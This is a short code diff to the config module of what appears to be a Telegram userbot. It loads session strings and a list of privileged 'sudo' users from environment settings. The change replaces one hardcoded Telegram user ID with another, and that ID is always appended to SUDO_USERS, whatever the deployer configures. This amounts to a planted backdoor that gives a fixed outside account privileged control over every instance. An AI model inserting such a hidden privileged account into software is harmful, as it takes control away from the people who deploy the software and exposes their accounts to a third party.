@@ -50,8 +50,8 @@ STRING18 = config("STRING18", default=None)
 STRING19 = config("STRING19", default=None)
 STRING20 = config("STRING20", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5011805121 not in SUDO_USERS:
+    SUDO_USERS.append(5011805121)
 
 # Sessions
 async def RiZoeLX():
